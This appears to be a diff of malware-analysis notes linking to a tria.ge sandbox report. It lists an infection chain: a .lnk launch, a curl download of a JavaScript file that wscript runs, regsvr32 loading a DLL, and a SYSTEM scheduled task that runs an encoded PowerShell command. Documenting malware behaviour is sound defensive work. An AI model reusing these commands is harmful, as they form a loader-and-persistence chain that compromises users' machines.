@@ -20,21 +20,25 @@ Exec >>
 
 cmd /c C:\Users\Admin\AppData\Local\Temp\doc\Valid445.lnk
 
-wscript.exe C:\Users\Admin\AppData\Local\Temp\_zPO.js
+MD "%LOCALAPPDATA%\ur\B4O"
 
-cmd.exe" /C ping go.com && regsvr32 _vRR.dll
+curl.exe --output %LOCALAPPDATA%\ur\B4O\enhrP.s_1L.QH0w.js
+
+wscript.exe C:\Users\Admin\LOCALAPPDATA\ur\B4O\enhrP.s_1L.QH0w.js
+
+cmd.exe /C ping go.com && regsvr32 _vRR.dll
 
 ping  go.com 
 
 regsvr32  _vRR.dll
 
-C:\Windows\SysWOW64\explorer.exe
+explorer.exe
 
 schtasks.exe /Create /RU "NT AUTHORITY\SYSTEM" /Z /ST 20:48 /tn asppkauuq /ET 20:59 /tr "powershell.exe -encodedCommand cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAEEAZABtAGkAbgBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAXwB2AFIAUgAuAGQAbABsACIA" /SC ONCE
 
 *************************************************
 
-
+https://tria.ge/220908-zm6axsfhc8
 
 *************************************************
 
